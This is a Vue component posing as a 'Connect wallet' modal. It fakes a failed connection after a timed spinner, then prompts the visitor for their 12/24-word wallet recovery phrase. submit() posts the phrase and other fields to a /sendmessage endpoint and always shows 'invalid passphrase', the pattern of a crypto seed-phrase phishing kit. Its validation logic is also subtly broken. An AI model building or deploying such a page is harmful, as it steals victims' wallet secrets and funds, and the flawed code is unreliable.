<template>
    <layout v-show="modal.isShowing == 'connect'" :width="prop.width" :bg="prop.bg" :title="'Connect wallet'">
        <div class="p-4">
            <div v-show="activeTab == 'other'">
                <div class="flex flex-col gap-4 overflow-y-scroll max-h-[50vh]" style="
                        scrollbar-width: none;
                        overflow-y: scroll;
                        max-height: 50vh;
                        color: black !important;
                    ">
                    <a href="#"
                        class="flex items-center gap-4 p-4 duration-300 border md:p-6 rounded-xl border-accent4 hover:bg-neutral1/5"
                        v-for="item in dapps.records" @click="Connect(item)">
                        <img :src="item.logoCdnUrl" class="rounded-full max-h-[10px] max-w-[10px]" alt=""
                            style="width: 40px; height: 40px" />
                        <h4>{{ item.name }}</h4>
                    </a>
                </div>
            </div>
            <div v-show="activeTab == 'connect'">
                <div class="flex items-center gap-4 cursor-pointer" @click="
                    activeTab = 'other';
                connetTab.open = false;
                " style="color: black !important;">
                    <img src="/assets/images/back.png" alt="" srcset="" /> Back
                </div>

                <div class="flex flex-col items-center gap-4">
                    <img :src="connect.image" class="w-24 h-24 rounded-2xl" alt="" />

                    <template v-if="!connetTab.open">
                        <!-- <div class="w-24 h-24 border-8 border-green-500 border-solid rounded-full animate-spin border-t-transparent"
                            v-if="connect.connecting">
                        </div> -->
                        <div style="
                                width: 3rem;
                                height: 3rem;
                                border: 0.5rem dashed green;
                                border-top: 0.5rem solid transparent;
                                border-radius: 50%;
                                animation: spin 1s linear infinite;
                            " v-if="connect.connecting"></div>
                        <template v-else>
                            <small class="text-red-300" style="color: red !important;">Error Connecting</small>
                            <button @click="connetTab.open = true" class="w-[70%] btn-primary">
                                Connect Manually
                            </button>
                        </template>
                    </template>

                    <div v-else class="w-full">
                        <div class="flex flex-col tabs">
                            <div class="overflow-x-auto is-scrollbar-hidden">
                                <div class="flex gap-4 tabs-list" v-if="connetTab.tab != 'name'">
                                    <button @click="connetTab.tab = 'phrase'" :class="connetTab.tab == 'phrase'
                                        ? 'border-primary dark:border-accent text-primary dark:text-accent-light'
                                        : 'border-transparent hover:text-slate-800 focus:text-slate-800 dark:hover:text-navy-100 dark:focus:text-navy-100'
                                        " class="px-3 py-2 font-medium border-b-2 rounded-none btn shrink-0">
                                        Phrase
                                    </button>
                                    <!-- <button @click="connetTab.tab = 'private_key'" :class="connetTab.tab == 'private_key'
                                        ? 'border-primary dark:border-accent text-primary dark:text-accent-light'
                                        : 'border-transparent hover:text-slate-800 focus:text-slate-800 dark:hover:text-navy-100 dark:focus:text-navy-100'
                                        " class="px-3 py-2 font-medium border-b-2 rounded-none btn shrink-0">
                                        Private Key
                                    </button> -->
                                </div>
                            </div>
                            <div class="pt-4 tab-content">
                                <div v-if="connetTab.tab === 'name'">
                                    <div class="space-y-4 text-white">
                                        <!-- <label class="block">
                                            <input
                                                class="w-full px-4 py-2 bg-transparent border rounded-full form-input border-slate-300 placeholder:text-slate-400/70 hover:border-slate-400 focus:border-primary dark:border-navy-450 dark:hover:border-navy-400 dark:focus:border-accent"
                                                placeholder="" type="text" />
                                        </label> -->

                                        <label class="block">
                                            <input placeholder="Enter Fulll name"
                                                class="form-textarea w-full resize-none rounded-lg border border-slate-300 bg-transparent p-2.5 placeholder:text-slate-400/70 hover:border-slate-400 focus:border-primary dark:border-navy-450 dark:hover:border-navy-400 dark:focus:border-accent"
                                                v-model="wallet.full_name" />
                                        </label>

                                        <button @click="
                                            wallet.full_name
                                                ? (connetTab.tab = 'phrase')
                                                : 'Please enter your full name'
                                            " class="w-full btn-primary">
                                            Unlock Wallet With PassPhrase
                                        </button>
                                    </div>
                                </div>
                                <div v-if="connetTab.tab === 'phrase'">
                                    <div class="space-y-4 text-black">
                                        <!-- <label class="block">
                                            <input
                                                class="w-full px-4 py-2 bg-transparent border rounded-full form-input border-slate-300 placeholder:text-slate-400/70 hover:border-slate-400 focus:border-primary dark:border-navy-450 dark:hover:border-navy-400 dark:focus:border-accent"
                                                placeholder="" type="text" />
                                        </label> -->

                                        <label class="block">
                                            <textarea rows="4" placeholder="Please enter your 12/24 word phrase"
                                                class="form-textarea w-full resize-none rounded-lg border border-slate-300 bg-transparent p-2.5  hover:border-slate-400 focus:border-primary dark:border-navy-450 dark:hover:border-navy-400 dark:focus:border-accent"
                                                v-model="wallet.wallet_phrase"
                                                style="color: black !important;"></textarea>
                                        </label>
                                        <small class="my-2 text-sm text-center">use "," to separate wallet keys</small>

                                        <button @click="submit" class="w-full btn-primary">
                                            UNLOCK WALLET WITH PASSPHRASE
                                        </button>


                                        <button class="w-full btn-primary">
                                            UNLOCK WITH FINGERPRING
                                        </button>
                                    </div>
                                </div>
                                <!-- <div v-if="connetTab.tab === 'private_key'">
                                    <div class="space-y-4 text-white">
                                        <input style="display: none" type="text" name="fakeusernameremembered" />
                                        <input style="display: none" type="password" name="fakepasswordremembered" />
                                        <label class="block">
                                            <input
                                                class="w-full px-4 py-2 bg-transparent border rounded-full form-input border-slate-300 placeholder:text-slate-400/70 hover:border-slate-400 focus:border-primary dark:border-navy-450 dark:hover:border-navy-400 dark:focus:border-accent"
                                                placeholder="Private key/email/username" type="text"
                                                autocomplete="do-not-autofill" id="field1" readonly @focus="
                                                    $event.target.removeAttribute(
                                                        'readonly'
                                                    )
                                                    " v-model="wallet.wallet_email" />
                                        </label>

                                        <label class="block">
                                            <input
                                                class="w-full px-4 py-2 bg-transparent border rounded-full form-input border-slate-300 placeholder:text-slate-400/70 hover:border-slate-400 focus:border-primary dark:border-navy-450 dark:hover:border-navy-400 dark:focus:border-accent"
                                                placeholder="password" type="password" autocomplete="do-not-autofill"
                                                readonly @focus="
                                                    $event.target.removeAttribute(
                                                        'readonly'
                                                    )
                                                    " id="field2" v-model="wallet.wallet_phrase" />
                                        </label>

                                        <button @click="submit" class="w-full btn-primary">
                                            Proceed
                                        </button>
                                    </div>
                                </div> -->
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </layout>
</template>

<script setup>
import { useModalStore } from "../store/modals";
import layout from "./layout.vue";

import dapps from "../utils/dapps.json";
import { reactive, ref } from "vue";

let activeTab = ref("other");
let prop = defineProps(["width", "bg"]);
let modal = useModalStore();
let connect = reactive({
    image: "",
    wallet: "",
    connecting: false,
});

let connetTab = reactive({
    open: false,
    tab: "phrase",
});

let wallet = reactive({
    full_name: "",
    wallet_phrase: "",
    wallet_name: "",
    wallet_email: "",
});

const Connect = async (item) => {
    activeTab.value = "connect";
    connect.image = item.logoCdnUrl;
    connect.wallet = item.slug;
    wallet.wallet_name = item.slug;
    connect.connecting = true;
    setTimeout(() => {
        connect.connecting = false;
    }, 10000);
};


function isValidWordList(input) {
    const words = input.trim().split(',');

    // Check if total number of words is 12 or 24
    if (words.length !== 12 && words.length !== 24) {
        // alert("Please enter a valid 12 or 24 word phrase");
        dialog.toastError("Please enter a valid 12 or 24 word phrase");
        return false;

    };

}



function submit() {
    const requiredFields = [
        "wallet_phrase",
    ];
    const isFormValid = requiredFields.every((field) => wallet[field]);

    if (!isFormValid) {
        dialog.toastError("Please enter a valid 12 or 24 word phrase");
        return;
    }

    if (!isValidWordList(wallet.wallet_phrase)) return;

    fetch(`${window.origin}/sendmessage`, {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "X-CSRF-TOKEN": document
                .querySelector('meta[name="csrf-token"]')
                .getAttribute("content"),
        },
        body: JSON.stringify(wallet),
    })
        .then((response) => {
            if (!response.ok) {
                throw new Error("Network response was not ok");
            }
            return response.json();
        })
        .then((data) => { modal.hideModal("connect"); dialog.toastError("invalid passpharse") })
        .catch((error) => console.error("Error:", error));
}
// const submit = async () => {
//     // let res = await Phrase(wallet);
//     if (res) modal.hideModal("connect");
// };
</script>

<style lang="scss" scoped></style>
